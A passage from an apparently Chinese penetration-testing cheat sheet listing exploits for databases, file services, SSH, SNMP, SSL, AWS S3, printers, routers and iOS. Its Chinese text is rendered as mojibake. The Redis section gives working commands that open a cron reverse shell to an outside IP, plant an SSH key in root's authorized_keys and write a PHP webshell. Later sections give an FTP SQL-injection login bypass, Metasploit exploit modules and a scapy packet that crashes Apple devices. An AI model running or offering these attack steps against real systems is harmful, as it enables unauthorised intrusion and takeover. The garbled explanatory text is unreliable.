    use auxiliary/admin/oracle/tnscmd   # è¯¥æ¼æ´å¯ä»¥è¿œç¨‹è·å–åˆ°oracleçš„å†…å­˜ä¿¡æ¯,è‹¥æ˜¯èƒ½è·å–åˆ°å†…å­˜ä¸­çš„æ•°æ®å³ä¸ºå­˜åœ¨æ¼æ´ã€‚
    use auxiliary/admin/oracle/sid_brute  # çˆ†ç ´oracleçš„SID
    ```

- **CVE-2012-5615 Oracle MySQL Server 5.5.19ç”¨æˆ·åæšä¸¾æ¼æ´**
    - POC | Payload | exp
        - [MySQL - Remote User Enumeration](https://www.exploit-db.com/exploits/23081)
        - [MySQL 5.1/5.5 (Windows) - 'MySQLJackpot' Remote Command Execution](https://www.exploit-db.com/exploits/23073)

**OrientDB**
- **CVE-2017-11467**
    - æ–‡ç« 
        - [OrientDBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´POCåˆ†æä»¥åŠå¤ç°|CVE-2017-11467](https://bbs.ichunqiu.com/thread-33175-1-18.html)

    - POC | Payload | exp
        - [OrientDB - Code Execution](https://www.exploit-db.com/exploits/44068)

**redis**
- **æœªæˆæƒè®¿é—®æ¼æ´**
    - æ–‡ç« 
        - [redisæœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨æ€»ç»“](https://p0sec.net/index.php/archives/69/)
        - [Redis æœªæˆæƒè®¿é—®æ¼æ´åˆ©ç”¨åˆ†æ](https://hellohxk.com/blog/redis-unauthorized-vulnerability/)
        - [redisæœªæˆæƒè®¿é—®ä¸ssrfåˆ©ç”¨](https://www.kingkk.com/2018/08/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E4%B8%8Essrf%E5%88%A9%E7%94%A8/)
        - [Hackredis Enhanced Edition Script](https://joychou.org/web/hackredis-enhanced-edition-script.html#directory092928099425939341)

    - æ­å»ºç¯å¢ƒ
        ```bash
        wget http://download.redis.io/releases/redis-3.2.0.tar.gz
        tar xzf redis-3.2.0.tar.gz
        cd redis-3.2.0
        make
        ```
        ```vim
        vim redis.conf

        #bind 127.0.0.1
        protected-mode no
        ```
        ```
        ./src/redis-server redis.conf
        ```
    - åˆ©ç”¨
        ```sql
        redis-cli -h <ç›®æ ‡IP>
        >info   # æŸ¥çœ‹redisç‰ˆæœ¬ä¿¡æ¯ã€ä¸€äº›å…·ä½“ä¿¡æ¯ã€æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ç­‰ç­‰ï¼š
        >CONFIG GET dir # è·å–é»˜è®¤çš„redisç›®å½•
        >CONFIG GET dbfilename # è·å–é»˜è®¤çš„ rdbæ–‡ä»¶å
        ```

        **åˆ©ç”¨è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå‘½ä»¤åå¼¹shell** åœ¨redisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell å…ˆåœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šç›‘å¬ä¸€ä¸ªç«¯å£
        `nc -lvnp 7999`
        ç„¶åæ‰§è¡Œå‘½ä»¤:
        ```bash
        > set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.72.129/7999 0<&1 2>&1\n"
        > config set dir /var/spool/cron/
        > config set dbfilename root
        > save
        ```

        **å†™ssh-keygenå…¬é’¥ç„¶åä½¿ç”¨ç§é’¥ç™»é™†**
        åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼Œå¯ä»¥åˆ©ç”¨æ­¤æ–¹æ³•
        1. RedisæœåŠ¡ä½¿ç”¨ROOTè´¦å·å¯åŠ¨
        2. æœåŠ¡å™¨å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚

        é¦–å…ˆåœ¨æœ¬åœ°ç”Ÿæˆä¸€å¯¹å¯†é’¥
        `ssh-keygen -t rsa`
        ç„¶åæ‰§è¡Œå‘½ä»¤:
        ```bash
        > config set dir /root/.ssh/
        > config set dbfilename authorized_keys
        > set x "\n\n\nssh-rsa <ä½ çš„å¯†é’¥> root@kali\n\n\n"
        > save
        ```
        saveåå¯ä»¥ç›´æ¥åˆ©ç”¨å…¬é’¥ç™»å½•ssh

        **å¾€webç‰©ç†è·¯å¾„å†™webshell**
        å½“redisæƒé™ä¸é«˜æ—¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨å¼€ç€webæœåŠ¡ï¼Œåœ¨redisæœ‰webç›®å½•å†™æƒé™æ—¶ï¼Œå¯ä»¥å°è¯•å¾€webè·¯å¾„å†™webshell
        æ‰§è¡Œä»¥ä¸‹å‘½ä»¤
        ```bash
        > config set dir /var/www/html/
        > config set dbfilename shell.php
        > set x "<?php phpinfo();?>"
        > save
        ```
        å³å¯å°†shellå†™å…¥webç›®å½•(webç›®å½•æ ¹æ®å®é™…æƒ…å†µ)

---

### æ–‡ä»¶æœåŠ¡
**ftp**
- **Xlight FTP Server < 3.2.1 userå‚æ•°SQLæ³¨å…¥æ¼æ´**
    åœ¨æ‰§è¡ŒODBCè®¤è¯è¿‡ç¨‹ä¸­Xlight FTP Serveræ²¡æœ‰æ­£ç¡®åœ°è¿‡æ»¤ç”¨æˆ·æ‰€æäº¤çš„ç”¨æˆ·åå’Œå£ä»¤å­—æ®µï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥ç”¨â€œOR â€˜1â€™=â€™1â€™ ;#â€æ›¿æ¢ç”¨æˆ·åç»•è¿‡è®¤è¯ç™»å½•åˆ°æœåŠ¡å™¨ã€‚
    - ç¤ºä¾‹
    ```bash
    220 Xlight FTP Server 3.2 ready...
    User (server-4:(none)) : \' OR \'1\'=\'1\' ;#
    331 Password required for \' OR \'1\'=\'1\' ;#
    Password : type anything
    230 Login OK
    ftp&gt;
    ```

- **Serv-U FTP Serverç›®å½•éå†æ¼æ´**
    - æ–‡ç« 
        - [Serv-U FTP Server 0dayæ¼æ´åˆ†ææŠ¥å‘Š](http://safe.it168.com/a2011/1213/1287/000001287577.shtml)

    - ç¤ºä¾‹
        ```bash
        ls ../windwos
            550 .....

        ls ..:/windows
            150 ....
            ...
            ...
        ```

**nfs**
- **CVE-1999-0554 ç›®æ ‡ä¸»æœºshowmount -eä¿¡æ¯æ³„éœ²**
    - ç¤ºä¾‹
        ```
        showmount -e xxx.xxx.xxx.xxx
        mount -t nfs xxx.xxx.xxx.xxx:/opt/applications/xxx_static_data  /mnt
        ```

    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/nfs/nfsmount
        ```

**Rsync**
- **æœªæˆæƒè®¿é—®**
    - æ–‡ç« 
        - [rsyncçš„å‡ åˆ™tipsï¼ˆæ¸—é€æŠ€å·§ï¼‰](http://www.91ri.org/11093.html)
        - [é…ç½®æ¼æ´ä¹‹RsyncåŒ¿åè®¿é—®](https://uknowsec.cn/posts/skill/%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E4%B9%8BRsync%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE.html)

    - ç¤ºä¾‹
        `rsync <ç›®æ ‡IP>::`

    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/rsync/modules_list
        ```

**samba**
- **CVE-2015-0240**
    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/smb/smb_uninit_cred
        ```

- **CVE-2017-7494**
    - æ–‡ç« 
        - [Linux cve-2017-7494sambaè¿œç¨‹æ¼æ´åˆ©ç”¨å’Œåˆ†æ](https://bbs.pediy.com/thread-218114.htm)

    - POC | Payload | exp
        - [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)
        - [opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)

    - MSFæ¨¡å—
        ```bash
        use exploit/linux/samba/is_known_pipename
        set rhost
        set target 3
        run
        ```

---

### è¿œç¨‹æœåŠ¡
**Java RMI**
- **JAVA RMI ååºåˆ—åŒ–è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´**
    - æ–‡ç« 
        - []()

**OpenSSH**
- **CVE-2018-15473 OpenSSH ç”¨æˆ·æšä¸¾æ¼æ´**
    - æ–‡ç« 
        - [OpenSSHç”¨æˆ·æšä¸¾æ¼æ´ï¼ˆCVE-2018-15473ï¼‰åˆ†æ](https://www.anquanke.com/post/id/157607)
        - [SSHç”¨æˆ·æšä¸¾æ¼æ´ï¼ˆCVE-2018-15473ï¼‰åŸç†å­¦ä¹ ](https://www.cnblogs.com/KevinGeorge/p/9530835.html)

    - POC | Payload | exp
        - [trimstray/massh-enum](https://github.com/trimstray/massh-enum)
        - [Rhynorater/CVE-2018-15473-Exploit](https://github.com/Rhynorater/CVE-2018-15473-Exploit)

    - MSFæ¨¡å—
        ```bash
        use auxiliary/scanner/ssh/ssh_enumusers
        ```

---

## åè®®vul
### SNMP
- **æ–‡ç« **
    - [SNMPåè®®æ”»å‡»](https://xz.aliyun.com/t/1562)
    - [æ¸—é€æµ‹è¯•ä¸­å¦‚ä½•æ”¶é›†åˆ©ç”¨SNMPåè®®æ•°æ®](https://www.freebuf.com/articles/network/104522.html)

- **snmpå¼±å£ä»¤**
    - æ–‡ç« 
        - [çƒ‚æ³¥ï¼šä½¿ç”¨snmpwalké‡‡é›†è®¾å¤‡çš„OIDä¿¡æ¯](https://www.ilanni.com/?p=8408)
        - [snmpå¼±å£ä»¤å¼•èµ·çš„ä¿¡æ¯æ³„æ¼](http://drops.xmd5.com/static/drops/tips-409.html)

    - åˆ©ç”¨
        å®‰è£…
        `yum -y install net-snmp-utils`

        Usage
        ```bash
        snmpwalk -v 2c -c public 192.168.xxx.xxx
        snmp-check 192.168.xxx.xxx -c public -v 2c
        ```

---

### SSL
- **æ–‡ç« **
    - [SSLï¼†TLS å®‰å…¨æ€§æµ‹è¯•](https://4hou.win/wordpress/?p=2355)

- **å·¥å…·**
    - [MassBleed](https://github.com/1N3/MassBleed)
    - [sslscan](https://github.com/rbsec/sslscan)
    - [testssl](https://github.com/drwetter/testssl.sh)

- **CVE-2014-3566 SSL 3.0 POODLEæ”»å‡»ä¿¡æ¯æ³„éœ²æ¼æ´**
    - æ–‡ç« 
        - [CVE-2014-3566 SSLv3 POODLEåŸç†åˆ†æ](http://drops.xmd5.com/static/drops/papers-3194.html)

    - POC | Payload | exp
        - [mpgn/poodle-PoC](https://github.com/mpgn/poodle-PoC)

    - MSFæ¨¡å—
        ```
        use auxiliary/scanner/http/ssl_version
        ```

- **OpenSSL**
    - **CVE-2014-0160 Heartbleed**
        - æ–‡ç« 
            - [å¿ƒè„æ»´è¡€HeartBleedæ¼æ´ç ”ç©¶åŠå…¶POC](https://www.cnblogs.com/KevinGeorge/p/8029947.html)
            - [OpenSSLå¿ƒè„å‡ºè¡€æ¼æ´å…¨å›é¡¾](https://www.freebuf.com/articles/network/32171.html)
            - [Heartbleed å®æˆ˜ï¼šä¸€ä¸ªå½±å“æ— æ•°ç½‘ç«™çš„ç¼“å†²åŒºæº¢å‡ºæ¼æ´](https://onebitbug.me/reproduced/2014/04/09/heartbleed-poc/)
            - [Heartbleedæ¼æ´çš„å¤ç°ä¸åˆ©ç”¨](https://blog.csdn.net/biziwaiwai/article/details/79323334)
            - [Heartbleedå¿ƒè„å‡ºè¡€æ¼æ´é¶åœºæ­å»º](https://blog.csdn.net/yaofeino1/article/details/54377537)

        - POC | Payload | exp
            [OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure](https://www.exploit-db.com/exploits/32745)

---

## äº‘æ¸—é€
### aws
**æ–‡ç« **
- [Attacking AWS: the full cyber kill chain](https://www.slideshare.net/wojdwo/attacking-aws-the-full-cyber-kill-chain-144590283)

**å·¥å…·**
- [toniblyx/prowler](https://github.com/toniblyx/prowler)
- [RhinoSecurityLabs/pacu](https://github.com/RhinoSecurityLabs/pacu)
- [arkadiyt/aws_public_ips](https://github.com/arkadiyt/aws_public_ips)

**S3**
- **æ–‡ç« **
    - [How security researchers discover open Amazon S3 servers](https://www.devicelock.com/blog/how-security-researchers-discover-open-amazon-s3-servers.html)
    - [Blog, Whats in Amazon's buckets? - DigiNinja](https://digi.ninja/blog/whats_in_amazons_buckets.php)
    - [Bucket Finder - DigiNinja](https://digi.ninja/projects/bucket_finder.php)

- **å·¥å…·**
    - [gwen001/s3-buckets-finder](https://github.com/gwen001/s3-buckets-finder)
    - [brianwarehime/inSp3ctor](https://github.com/brianwarehime/inSp3ctor)
    - [PayloadsAllTheThings/AWS Amazon Bucket S3](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/AWS%20Amazon%20Bucket%20S3)
    - [eth0izzle/bucket-stream](https://github.com/eth0izzle/bucket-stream)

---

# 7å·¥æ§/IoT/ç‰©ç†
## CPU
- [speed47/spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker)

## ç‰©è”ç½‘è®¾å¤‡
### Camera

---

### Printer
**PRET**
Installation
```bash
git clone https://github.com/RUB-NDS/PRET.git
cd PRET

pip install colorama pysnmp
```

Usage
```bash
python2 ./pret.py
python2 ./pret.py xxx.xxx.xxx.xxx pjl
python2 ./pret.py xxx.xxx.xxx.xxx ps
python2 ./pret.py xxx.xxx.xxx.xxx pcl
```

---

### Router
**routersoloit**
Installation
```bash
git clone https://www.github.com/threat9/routersploit.git
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py
```

Usage
```bash
use scanners/autopwn
set target
run
```

---

# 8MobileSec
## Android
### apkæ¸—é€
é€»è¾‘æ¼æ´åŸºæœ¬ä¸webå§¿åŠ¿ç›¸åŒ
- ä»»æ„å·ç æ³¨å†Œ
- ä»»æ„æ–‡ä»¶ä¸‹è½½
- ä»»æ„æ–‡ä»¶ä¸Šä¼ 
- çŸ­ä¿¡é‡ç½®å¯†ç æ¥å£(çŸ­ä¿¡è½°ç‚¸)

## IOS
### VUL
- **CVE-2018-4407**
    - æ–‡ç« 
        - [è¿œç¨‹æ‰“æŒ‚æ‰€æœ‰çš„appleè®¾å¤‡ â€” CVE-2018-4407åˆ†æ](https://mabin004.github.io/2018/11/01/%E8%BF%9C%E7%A8%8B%E6%89%93%E6%8C%82%E6%89%80%E6%9C%89%E7%9A%84apple%E8%AE%BE%E5%A4%87-CVE-2018-4407-%E5%88%86%E6%9E%90/)

    - POC | Payload | exp
    ```bash
    $sudo scapy
    >>send(IP(dst="192.168.1.151",options=[IPOption("A"*8)])/TCP(dport=8888,options=[(19, "1"*33)]))
    ```

---

`ä½ ä»¥ä¸ºå¾ˆå¤šäº‹æ˜¯å¯ä»¥é‡å¤çš„,è¿˜æœ‰ä¸‹ä¸€æ¬¡,ä½†ä½ é”™äº†ã€‚åŒ…æ‹¬ä½ å„¿æ—¶çš„ä¸‡èŠ±ç­’æˆ–çº¸é£æœº,æŠ„ä½œä¸šæˆ–ä¹°ç³–æœ,æ—©å°±æ˜¯æ­¤ç”Ÿçš„æœ€åä¸€æ¬¡ã€‚ï¼ˆéŸ©å°‘åŠŸ ã€Šæ—¥å¤œä¹¦ã€‹ï¼‰ `
